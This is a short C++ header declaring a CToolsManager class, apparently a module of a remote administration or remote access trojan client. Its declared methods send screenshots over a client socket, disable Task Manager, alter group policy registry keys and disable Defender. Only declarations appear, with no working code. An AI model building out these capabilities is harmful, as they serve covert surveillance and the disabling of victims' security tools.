#pragma once
#include"../../PublicInclude/Manager.h"

class CToolsManager : public CManager
{
public:
	void OnReceive(LPBYTE lpBuffer, UINT nSize);
	CToolsManager(CClientSocket* ClientObject);
	virtual ~CToolsManager();

	void SendScreenshots();
	void SetTDisableTaskMgr(BOOL swiTch);
	void SetGroupPolicy(DWORD dwSection,char* RegPath,char* Regkey,DWORD  swiTch);
	void SetTDisableDef(BOOL swiTch);
};

